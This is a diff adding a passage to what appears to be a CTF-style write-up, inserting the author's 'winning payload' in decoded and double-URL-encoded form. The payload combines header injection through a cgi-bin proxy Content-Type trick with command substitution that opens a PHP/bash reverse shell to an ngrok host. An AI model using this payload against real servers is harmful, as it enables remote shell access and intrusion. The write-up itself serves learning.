@@ -252,7 +252,15 @@ I’m not gonna lie — I spent hours testing all kinds of reverse shells: bash,
 Some were filtered. Some had special characters that broke the payload. Some were too long. Some needed binaries that weren't even present on the server.
 
 Finally, I landed on **PHP** with a **proxy header double URL-encoded trick**. Here’s the winning payload:
+Decoded URL:
+```
+GET /cgi-bin/attack-domain?target=Glitch&name=a
+Location: /a
+Content-Type: proxy:http://127.0.0.1/cgi-bin/attack-ip?target=::1%$(php -r '$sock=fsockopen("0.tcp.in.ngrok.io",4040);`bash <&3 >&3 2>&3`;')&name=
 
+ HTTP/1.1
+```
+Encoded URL: (Ensure URL Encodeing)!
 ```
 GET /cgi-bin/attack-domain?target=Glitch&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(php%2b-r%2b'$sock%253dfsockopen(%220.tcp.in.ngrok.io%22,4040)%253b%60bash%2b<%25263%2b>%25263%2b2>%25263`%253b')%26name=%0d%0a%0d%0a HTTP/1.1
 ```
